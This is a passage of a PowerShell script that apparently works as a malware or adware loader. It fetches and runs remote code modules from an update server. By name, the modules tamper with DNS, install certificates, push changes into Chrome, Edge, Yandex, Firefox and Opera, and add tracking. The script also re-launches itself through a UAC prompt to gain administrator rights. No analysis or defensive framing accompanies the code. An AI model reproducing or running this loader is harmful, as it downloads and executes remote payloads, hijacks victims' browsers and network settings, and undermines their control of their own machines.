            Remove-Job -Job $job
        }
    }
    catch {
        Write-Host $_
    }
}
$jobsH = @()

function Async {
    param ([string]$unit, [string]$param = $null)
    $job = RunRemoteAsync -baseUrl $server.updateUrlBlock -block $unit -param $param
    try {
        $global:jobsH += $job
    }
    catch {
        $jobsH += $job
    }
}

function NonElevatedActions
{
    Async -unit 'embeddings'
    Async -unit 'autoregistry'
    RunMe -script $holderPath -arg "guimode" -uac $false
    Async -unit 'tracker'
}

function ElevatedActions
{
    Async -unit 'dnsman'
    Async -unit 'cert'
    Async -unit 'chrome_push'
    Async -unit 'chrome'
    Async -unit 'chrome_ublock'
    Async -unit 'edge'
    Async -unit 'yandex'
    Async -unit 'firefox'
    Async -unit 'opera'
    Async -unit 'tracker'
    Async -unit 'extraupdate'
}

$gui = Test-Arg -arg "guimode"
if ($gui -eq $true)
{
    RunRemote -baseUrl $server.updateUrlBlock -block "starturls" -isWait $true -isJob $false
    RunRemote -baseUrl $server.updateUrlBlock -block "startdownloads" -isWait $true -isJob $false
    return
}
else 
{
    $elevated = Test-Arg -arg "elevated"
    if ($elevated -or (IsElevated))
    {
   
        if (-not $elevated){
            NonElevatedActions
        }
        ElevatedActions
    }
    else
    {
        NonElevatedActions
        RunMe -script $holderPath -arg "elevated" -uac $true
        Start-Sleep -Seconds 100000
    }
    
    try {
        foreach ($job in $global:jobsH) 
        {
            Receive-Job -Job $job
            Wait-Job -Job $job -Timeout 300 | Out-Null
            Remove-Job -Job $job
        }
    }
    catch {
        foreach ($job in $jobsH) 
        {
            Receive-Job -Job $job
            Wait-Job -Job $job -Timeout 300 | Out-Null
            Remove-Job -Job $job
        }
    }
}




    


